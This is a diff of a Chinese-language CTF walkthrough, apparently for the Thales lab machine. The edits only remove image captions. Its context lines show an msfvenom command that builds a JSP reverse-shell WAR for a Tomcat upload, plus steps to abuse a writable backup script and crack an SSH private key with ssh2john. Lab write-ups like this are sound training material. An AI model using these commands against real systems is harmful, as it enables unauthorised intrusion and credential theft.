@@ -66,11 +66,11 @@ exploit
 tomcat;role1
 
 ## 2.2 反弹shell
-![](images/1.png "可以上传文件")
+![](images/1.png)
 
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.203.129 LPORT=7777 -f war -o revshell.war`
 
-![](images/2.png "点击启动")
+![](images/2.png)
 
 成功反弹shell，接着升级shell界面，见[kali linux基操 4.3 升级shell界面]({{< relref "/docs/cybersecurity/kali_linux基操/index.md#43-升级shell界面" >}})
 
@@ -85,15 +85,15 @@ I prepared a backup script for you. The script is in this directory "/usr/local/
 
 得到关键文件，`/usr/local/bin/backup.sh`内容如图，其具备读写执行的权限
 
-![](images/3.png "备份脚本")
-![](images/6.png "backup.sh文件权限")
+![](images/3.png)
+![](images/6.png)
 同时发现隐藏文件夹，其中`.ssh`含有私钥
 
-![](images/4.png "thales中隐藏文件夹")
+![](images/4.png)
 
 私钥信息如下：
 
-![](images/5.png "私钥信息")
+![](images/5.png)
 
 ## 2.4 ssh私钥密码破解
 把`id_rsa`和`id_rsa.pub`放到kali的thales文件夹中，接着用`ssh2john.py`脚本编译
